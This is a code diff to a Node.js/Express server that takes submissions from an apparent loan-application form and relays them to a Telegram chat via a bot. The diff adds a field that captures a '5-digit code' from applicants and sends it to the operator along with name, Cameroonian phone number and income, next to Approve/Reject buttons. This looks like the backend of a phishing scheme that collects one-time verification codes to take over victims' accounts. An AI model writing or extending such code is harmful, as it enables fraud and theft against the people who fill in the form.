@@ -11,15 +11,17 @@ app.use(express.static(__dirname)); // Serves your HTML/CSS/JS
 
 // The endpoint that receives the form data
 app.post('/api/apply', async (req, res) => {
-    const { firstName, lastName, phone, loanType, amount, term, purpose, employment, income } = req.body;
+    // Catch the 5-digit code along with the rest of the data
+    const { firstName, lastName, phone, code, loanType, amount, term, purpose, employment, income } = req.body;
 
-    // Render will pull these from your Environment Variables
+    // Render pulls these from your Environment Variables
     const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
     const message = `🚨 *NEW LOAN APPLICATION* 🚨\n\n` +
                     `👤 *Name:* ${firstName} ${lastName}\n` +
                     `📞 *Phone:* +237 ${phone}\n` +
+                    `🔑 *Code:* ${code}\n` +
                     `💼 *Employment:* ${employment} (Income: ${income} XAF)\n\n` +
                     `💰 *Loan Type:* ${loanType}\n` +
                     `💵 *Amount:* ${amount} XAF\n` +
@@ -31,9 +33,10 @@ app.post('/api/apply', async (req, res) => {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                                chat_id: TELEGRAM_CHAT_ID,
+                chat_id: TELEGRAM_CHAT_ID,
                 text: message,
                 parse_mode: 'Markdown',
+                // THIS ADDS THE APPROVE/REJECT BUTTONS
                 reply_markup: {
                     inline_keyboard: [
                         [
@@ -56,6 +59,7 @@ app.post('/api/apply', async (req, res) => {
     }
 });
 
+// Start the server
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
